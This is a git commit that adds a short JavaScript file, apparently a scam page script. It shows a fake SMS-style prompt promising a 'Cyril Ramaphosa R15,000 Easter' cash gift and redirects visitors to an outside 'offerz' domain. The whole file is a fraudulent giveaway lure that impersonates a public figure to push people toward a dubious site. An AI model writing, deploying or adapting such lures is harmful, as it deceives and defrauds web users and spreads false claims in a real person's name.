daf51f6b6164ac508e1f9e85423c7413a3bae6b5
bigetijazz19 <bigetijazz19@gmail.com>
2025-04-07 11:41:13 +0100

    Create southaeaster.js

---
+++ southaeaster.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM R15,000'
+password=prompt('SMS: Congratulations, Get CYRIL RAMAPHOSA R15,000 EASTER celebration cash gifts to all, click Ok to claim this offer now','CLAIM R15,000');
+if (password != 'CLAIM R15,000') {
+location.href='https://www.ntegha-offerz.xyz/easter-R15000';
+}
